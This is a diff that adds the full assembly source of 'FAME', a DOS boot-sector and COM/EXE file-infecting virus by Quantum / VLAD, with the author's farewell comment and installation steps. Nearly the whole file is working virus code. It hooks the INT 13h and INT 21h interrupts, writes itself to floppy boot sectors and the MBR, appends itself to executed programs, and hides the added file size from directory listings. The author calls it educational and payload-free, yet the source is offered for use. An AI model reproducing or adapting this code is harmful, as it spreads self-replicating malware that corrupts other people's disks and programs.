@@ -1,0 +1,573 @@
+
+;
+; FAME by Quantum / VLAD
+;
+; This will be my last virus that I write for VLAD.. mainly because I have
+; grown bored with the virus scene and had my "taste of fame". I hope that
+; someone will learn something from this virus as often coders just look
+; at virus code and see a mess. I have moved on from "hack coding" and
+; hope that one day you also will do so. Neways.. Here are the specs:
+;
+; Boot/Com/Exe Infector with minimum stealth aimed at fast infection.
+; It contains no payload and is designed for educational purposes.
+;
+; To install you will have to copy the boot sector off a disk
+; onto absolute sector 1,0,14 and then copy the first 256 bytes
+; from the .bin created with a86 over the boot sector then copy the
+; remaining bytes over sector 1,0,15 and finally boot off the disk.
+;
+
+org 0
+
+; on entry to a boot sector cs=0 and ip = 7c00h
+
+cli
+xor ax,ax
+mov ss,ax
+mov si,7c00h      ; there is no stack so you have to setup your own
+mov sp,si
+sti
+
+push cs
+pop ds
+
+int 12h           ; get the current top of memory
+
+dec ax            ; decrease it by 1k
+
+mov [413h],ax     ; tell bios about it
+
+mov cl,06h        ; convert that to a segment
+shl ax,cl
+
+mov cx,0200h
+mov bx,cx
+mov es,ax         ; copy the first half of da virus into that segment
+xor di,di
+cld
+rep movsb
+
+mov ax,0201h
+mov dh,1
+mov cx,15         ; load the second half of da virus off the disk into
+or dl,dl          ; the second half of the segment
+jns tisflop2
+mov cx,3
+xor dh,dh
+tisflop2:
+int 13h
+
+mov byte ptr es:[offset i21set],0          ; we have yet to setup int 21
+
+mov si,13h*4
+mov di,offset oi13
+push si
+movsw                                 ; setup the int 13 handler
+movsw
+pop si
+mov word ptr [si],offset int13h
+mov word ptr [si+2],es
+
+int 19h                      ; load the real boot sector
+
+int13h:
+
+        ; write org sector to 1,0,14 on floppies
+        ; write second half of virus at 1,0,15 on floppies
+        ; write org sector to 0,0,2 on mbr
+        ; write second half of virus at 0,0,3 on mbr
+
+        cmp ax,0121h
+        jnz not13serv               ; int 13 installation check
+        xor cx,cx
+        iret
+not13serv:
+
+        cmp ah,2                   ; are we reading ?
+        jnz return
+
+        call callit
+        jc justretf
+        pushf
+
+        push ax
+        push bx
+        push cx
+        push dx
+        push es
+
+        or dh,dh         ; dh,dh = all .. dx,dx = floppy only..
+        jnz checkit
+        cmp cx,1
+        jnz checkit
+
+        cmp word ptr es:[bx+offset marker],"uQ"   ; is the boot already infected ?
+        jz stealthit
+
+infectit:
+
+        mov cl,14
+        mov dh,1
+        or dl,dl
+        jns tisflop      ; no.. infect it
+        mov cl,2
+        xor dh,dh
+tisflop:
+        mov ax,0301h
+        call callit
+        inc cl
+        push cs
+        pop es
+        mov bx,200h
+        mov ax,0301h
+        call callit
+
+        xor bx,bx
+
+        mov cl,1
+        xor dh,dh
+        mov ax,0301h
+        call callit
+
+getout:
+        pop es
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+
+popfandretf:
+        popf
+justretf:
+        retf 2
+
+stealthit:
+
+        mov cl,14
+        mov dh,1
+        or dl,dl
+        jns tisflop1       ; yes .. so stealth it
+        mov cl,2
+        xor dh,dh
+tisflop1:
+        mov ax,0201h
+        call callit
+
+        jmp getout
+
+return:
+
+        db 0eah
+oi13    dw 0,0
+
+callit:
+
+        pushf
+        call far ptr cs:[offset oi13]    ; call the original int 13
+        ret
+
+checkit:
+        ; check to see if we're reading an exe and if so setup int21 if
+        ; we havnt already done so
+
+        cmp byte ptr cs:[offset i21set],1       ; already setup ?
+        jz getout
+
+        cmp word ptr es:[bx],"ZM"       ; starts with 'MZ' ?
+        jnz getout
+
+        push ds
+        push si
+        push di
+
+        xor ax,ax
+        mov ds,ax
+
+        push cs
+        pop es
+
+        mov si,21h*4
+        mov di,offset oi21
+        push si
+        movsw                              ; setup int 21
+        movsw
+        pop si
+        mov word ptr [si],offset newi21
+        mov word ptr [si+2],es
+
+        mov byte ptr cs:[offset i21set],1    ; set the flag so we wont do it again
+
+        pop di
+        pop si
+        pop ds
+
+        jmp getout
+
+        db "FAME by "
+marker: db "Quantum / VLAD"
+
+newi21:         ; the new int 21 handler
+
+        cmp ax,2021h
+        jnz notserv            ; are we checking for residence ?
+        mov cx,2021h
+        iret
+notserv:
+
+        xchg ah,al
+
+        cmp al,4bh                ; are we executing ?
+        jz executing
+        cmp al,11h
+        jz dirstealth          ; are we diring ?
+        cmp al,12h
+        jz dirstealth
+
+        push ax
+        push cx
+        push ds
+        push es
+        push si
+        push di
+        mov ax,0121h                ; is int 13 already setup ?
+        mov cx,ax
+        int 13h
+        or cx,cx
+        jz werein
+        mov ds,cx
+        push cs
+        pop es
+        mov si,13h*4
+        mov di,offset oi13              ; if not set it up
+        push si
+        movsw
+        movsw
+        pop si
+        mov word ptr [si-4],offset int13h
+        mov [si-2],es
+werein:
+        pop di
+        pop si
+        pop es
+        pop ds
+        pop cx
+        pop ax
+playold:
+
+        xchg ah,al
+
+        db 0eah
+oi21    dw 0,0
+i21set  db 0
+
+call21: pushf
+        call far ptr cs:[offset oi21]       ; calls the original int 21
+        ret
+
+
+dirstealth:
+
+        xchg ah,al
+        call call21                    ; let the dir read through
+
+        push ax
+        push bx
+        push cx
+        push dx
+        push si
+        push di
+        push ds
+        push es
+
+        or al,al
+        jnz dirfail
+
+        mov ah,2fh         ; get dta
+        call call21
+
+        push es
+        pop ds
+
+        cmp byte ptr [bx],0FFh             ; is it extended fcb ?
+        jnz notext
+        add bx,7
+notext:
+
+        cmp word ptr [bx+17h],0           ; is the time 0 ?
+        jnz dirfail
+
+        sub word ptr [bx+1dh],offset vend          ; stealth the size
+        sbb word ptr [bx+1fh],0
+
+dirfail:pop es
+        pop ds
+        pop di
+        pop si
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+
+        retf 2
+
+executing:
+
+        push ax
+        push bx
+        push cx
+        push dx
+        push si
+        push di
+        push ds
+        push es
+
+        mov ax,03d02h
+        call call21           ; open in read/write mode
+
+        xchg bx,ax
+
+        call seekstart            ; goto the start
+
+        push cs
+        push cs
+        pop ds
+        pop es
+
+        mov ah,3fh
+        mov cx,18h
+        mov dx,offset buffer           ; read in first 18h bytes
+        mov si,dx
+        call call21
+
+        call isitinfected
+        jz closefile                     ; is the file already infected ?
+        and cl,11100000b
+        or cl,2
+
+        push cx
+        push dx
+
+        cmp word ptr [si],"ZM"          ; is it an exe ?
+        jz infectexe
+
+        jmp cominfect
+
+infectexe:
+
+        mov di,offset jumpsave
+
+        mov ax,[si+14h]
+        stosw
+        mov ax,[si+16h]             ; save the old entrypoint and stack
+        stosw
+        mov ax,[si+0eh]
+        stosw
+        mov ax,[si+10h]
+        stosw
+
+        call seekend           ; goto end of the file
+
+        mov cx,16                ; calculate the size in paragraphs
+        DIV cx
+
+        add dx,20h
+        dec ax
+        dec ax
+        jc closefile
+
+        sub ax,[si+08h]
+        add dx,offset comstart  ; calculate the new entrypoint
+        mov [si+14h],dx
+        mov [si+16h],ax
+
+        mov byte ptr ds:[offset comorexe],0     ; set the comorexe flag to nil
+
+        mov cx,offset vend
+        xor dx,dx                                 ; dump the virus
+        call writefile
+
+        call seekend           ; goto the end
+
+        mov cx,512
+        DIV cx                ; calculate the image size
+        inc ax
+
+        mov [si+2],dx
+        mov [si+4],ax        ; shove it in the header
+        mov [si+0eh],ax
+        mov [si+10h],0400h     ; setup the stack
+
+        call seekstart       ; back to the start
+
+        mov cx,18h
+        mov dx,si             ; dump the exe header
+        call writefile
+
+        jmp settime
+
+closefile:
+
+        mov ah,3eh           ; close the file
+        call call21
+
+        pop es
+        pop ds
+        pop di
+        pop si
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+
+        jmp playold
+
+buffer: db 18h dup (0)
+jmpblock: db 0e9h,0,0
+comorexe: db 0
+
+cominfect:
+        call seekend        ; goto end of the com
+
+        push ax
+
+        mov cx,3
+        mov dx,si                ; write the first 3 bytes
+        call writefile
+
+        mov byte [offset comorexe],1        ;set the comorexe flag
+
+        mov cx,offset vend
+        xor dx,dx                  ; dump the virus
+        call writefile
+
+        pop ax
+        add ax,offset comstart            ; setup the jump construct
+        mov [offset jmpblock+1],ax
+
+        call seekstart             ; back to the start
+
+        mov cx,3
+        mov dx,offset jmpblock        ; write the jump block
+        call writefile
+
+
+settime:
+
+        pop dx
+        pop cx
+
+        mov ax,05701h              ; set the time
+        call call21
+
+        jmp closefile
+
+seekend:
+        mov ax,04202h              ; seek to end
+lseek:
+        xor cx,cx
+        xor dx,dx               ; seek to rest
+        call call21
+        ret
+
+seekstart:
+        mov ax,04200h         ; seek to start
+        jmp lseek
+
+writefile:
+        mov ah,40h             ; write to the file
+        call call21
+        ret
+
+isitinfected:
+
+        mov ax,5700h      ; check the time to seek if infected
+        call call21
+
+        push cx
+        and cl,11111b
+        cmp cl,2
+        pop cx
+
+        ret
+
+
+comstart:           ; code that will be executed on start of file infections
+
+        push es       ; save the psp
+
+        call recalc
+recalc: pop bp                           ; calculate the delta offset
+        sub bp,offset recalc
+
+        mov ax,2021h
+        int 21h               ; check to see if int21 setup
+        cmp cx,2021h
+        jz nowrites
+
+        mov ax,es
+        dec ax             ; get the mcb
+        mov ds,ax
+
+        xor si,si
+        cmp byte ptr [si],"Z"       ; is it last block ?
+        jnz nowrites
+
+        sub word ptr [si+3],(offset vend)/16+1
+        sub word ptr [si+12h],(offset vend)/16+1      ; deallocate some space
+        mov ax,[si+12h]
+        mov es,ax
+
+        mov ds,si
+
+        mov si,84h
+
+        push es
+        push cs
+        pop ds                                        ; setup int 21
+        lea di,[bp+offset oi21]
+        movsw
+        movsw
+        pop es
+
+        mov word ptr [si-4],offset newi21
+        mov word ptr [si-2],es
+
+        push cs
+        pop ds
+
+        mov si,bp
+        xor di,di
+        mov cx,offset vend            ; copy the virus into memory
+        rep movsb
+
+nowrites:
+
+        pop es
+        cmp byte [bp+offset comorexe],1     ; is it a com or exe ?
+        jz comreturn
+
+        mov ax,es
+        add ax,10h
+        lea di,[bp+jumpsave+2]
+        add [di],ax
+        cli
+        add ax,[di+4]
+        mov ss,ax                         ; return to host for exes
+        mov sp,[di+6]
+        sti
+        jmp $+2
+        db 0eah
+jumpsave: dw 0,0
+          dw 0,0
+
+comreturn:
+        push cs
+        pop es
+        lea si,[bp-3]
+        mov di,0100h              ; return to host for coms
+        push di
+        movsw
+        movsb
+        ret
+
+vend:
